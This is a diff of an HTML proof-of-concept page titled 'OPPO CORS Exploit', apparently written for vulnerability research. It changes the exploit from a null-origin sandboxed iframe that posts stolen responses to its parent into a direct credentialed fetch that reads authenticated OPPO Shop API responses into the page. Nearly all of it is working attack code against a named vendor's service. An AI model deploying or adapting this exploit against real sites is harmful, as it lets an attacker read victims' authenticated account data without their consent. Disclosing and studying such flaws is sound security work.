@@ -92,10 +92,7 @@ background:#f5f6f8;
 padding:12px;
 border-radius:6px;
 white-space:pre-wrap;
-word-wrap:break-word;
-overflow-wrap:break-word;
 font-size:13px;
-line-height:1.4;
 }
 
 </style>
@@ -109,7 +106,7 @@ line-height:1.4;
 <h1>OPPO CORS Exploit Proof of Concept</h1>
 
 <div class="description">
-This PoC demonstrates a CORS misconfiguration allowing authenticated requests to OPPO Shop APIs when executed from a sandbox iframe with <b>null origin</b>.
+This page demonstrates a CORS misconfiguration allowing authenticated API requests to be executed and read from an external origin.
 </div>
 
 <button onclick="runExploit()">Run Exploit</button>
@@ -161,52 +158,30 @@ createCard(
 
 function request(url,label){
 
-let iframe=document.createElement("iframe")
-
-iframe.sandbox="allow-scripts"
-iframe.style.display="none"
-
-let payload=`
-<script>
-
-fetch("${url}",{
+fetch(url,{
+method:"GET",
 credentials:"include"
 })
-.then(r=>r.text())
+.then(response=>{
+
+document.getElementById(label+"_status").innerText="STATUS: "+response.status
+
+return response.text()
+
+})
 .then(data=>{
-parent.postMessage({
-label:"${label}",
-status:"SUCCESS",
-body:data
-},"*")
+
+document.getElementById(label+"_data").innerText=data
+
 })
-.catch(e=>{
-parent.postMessage({
-label:"${label}",
-status:"ERROR",
-body:e.toString()
-},"*")
+.catch(error=>{
+
+document.getElementById(label+"_status").innerText="ERROR"
+document.getElementById(label+"_data").innerText=error
+
 })
-
-<\/script>
-`
-
-iframe.srcdoc=payload
-
-document.body.appendChild(iframe)
 
 }
-
-window.addEventListener("message",function(e){
-
-let label=e.data.label
-
-if(!label) return
-
-document.getElementById(label+"_status").innerText=e.data.status
-document.getElementById(label+"_data").innerText=e.data.body
-
-})
 
 function runExploit(){
 
